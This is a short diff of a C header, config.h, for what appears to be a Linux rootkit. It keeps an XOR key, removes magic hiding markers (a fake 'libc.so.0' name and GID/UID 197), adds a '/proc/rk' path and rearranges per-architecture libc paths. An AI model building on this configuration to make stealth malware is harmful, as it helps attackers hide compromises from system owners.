@@ -3,22 +3,16 @@
 
 #define XORKEY          (uint32_t)0xdeadbeef;
 
-#define LIBC_PATH       "/lib/x86_64-linux-gnu/libc.so.6"
-
-#define MAGIC_STRING    "libc.so.0"
-#define MAGIC_GID       197
-#define MAGIC_UID       197
+#define RK_PATH         "/proc/rk"
 
 #ifdef __i386__
 #define BUILD_ARCH      "i686"
+#define LIBC_PATH       "/lib/i686-linux-gnu/libc.so.6"
 #endif
 
 #ifdef __x86_64__
 #define BUILD_ARCH      "x86_64"
-#endif
-
-#ifdef __arm__
-#define BUILD_ARCH      "v6l"
+#define LIBC_PATH       "/lib/x86_64-linux-gnu/libc.so.6"
 #endif
 
 #endif /* config.h */
